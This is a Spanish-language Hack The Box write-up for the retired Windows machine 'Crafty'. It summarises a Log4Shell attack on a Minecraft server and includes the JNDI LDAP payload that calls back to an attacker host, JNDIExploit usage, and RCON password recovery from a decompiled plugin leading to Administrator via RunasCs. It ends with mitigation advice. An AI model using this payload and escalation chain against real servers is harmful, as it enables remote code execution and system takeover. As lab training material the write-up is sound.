---
machine: Crafty
os: Windows
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [windows, minecraft, log4shell, rcon, java]
---

# Crafty — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Un servidor Minecraft 1.16.5 es vulnerable a Log4Shell. El chat entrega una shell en Windows; el plugin descompilado revela la contraseña de RCON y con ella se ejecuta `RunasCs` como Administrator.

## Reconocimiento

```bash
nmap -Pn -sCV -p25565,80 <IP>
mcstatus <IP>:25565
# Payload en el chat del servidor
# ${jndi:ldap://<IP>:1389/exploit}
java -jar JNDIExploit.jar -i <IP>
# Plugin descargado desde el panel
unzip Crafty.jar -d plugin && jadx plugin
mcrcon -H <IP> -P 25575 -p "<PASS>" "whoami"
```

## Enumeración

- Minecraft en `25565` y un panel web de Crafty.
- La versión del servidor usa Log4j vulnerable.
- El plugin descargable contiene configuración y credenciales de RCON.

## Acceso inicial

Se envía `${jndi:ldap://<IP>:1389/...}` en el chat. El servidor vulnerable carga la clase remota y ejecuta el payload; se obtiene una sesión como el usuario que corre Minecraft.

## Escalada de privilegios

El JAR del plugin se descomprime y se descompila; su configuración incluye la contraseña de RCON. Se conecta a `25575` con `mcrcon` y se lanza `RunasCs` para ejecutar como Administrator.

## Evidencia

- Callback LDAP desde el servidor Minecraft.
- Shell en Windows tras la explotación.
- Conexión RCON y `whoami` como Administrator.

## Lecciones aprendidas

- Log4Shell sigue apareciendo en servicios de juego y paneles antiguos.
- Los plugins incluyen secretos que no están en la web.
- RCON es una puerta de ejecución si se reutiliza la contraseña.

## Mitigación y detección

- Actualizar Log4j y Java; bloquear JNDI y salidas LDAP.
- Rotar la contraseña de RCON y limitarla a loopback.
- Revisar y firmar los plugins antes de instalarlos.

## Referencias

- [0xdf — Crafty](https://0xdf.gitlab.io/2024/06/15/htb-crafty.html)
- [NVD — CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [Hack The Box — Crafty](https://app.hackthebox.com/machines/crafty)
